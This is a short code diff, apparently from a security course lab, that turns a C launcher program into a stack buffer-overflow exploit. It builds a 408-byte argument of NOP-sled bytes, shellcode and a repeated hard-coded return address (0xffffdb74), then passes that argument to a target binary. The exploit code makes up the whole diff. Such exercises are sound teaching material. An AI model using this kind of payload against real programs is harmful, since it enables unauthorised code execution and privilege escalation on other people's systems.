@@ -11,9 +11,24 @@ int main(void)
 {
   char *args[3]; 
   char *env[1];
+
+  char str[408];
+  memset(str, 0, 408);
+
+  for (int i = 0; i < 203; ++i)
+  {
+    strcat(str, "\x90");
+    }
+  strcat(str, shellcode);
+
+  for (int i = 0; i < 38; ++i)
+  {
+    strcat(str, "\x74\xdb\xff\xff");
+
+  }
   
   args[0] = TARGET;
-  args[1] = "student"; 
+  args[1] = str; 
   args[2] = NULL;
   
   env[0] = NULL;
@@ -22,5 +37,6 @@ int main(void)
 
   return 0;
 }
+
 
 
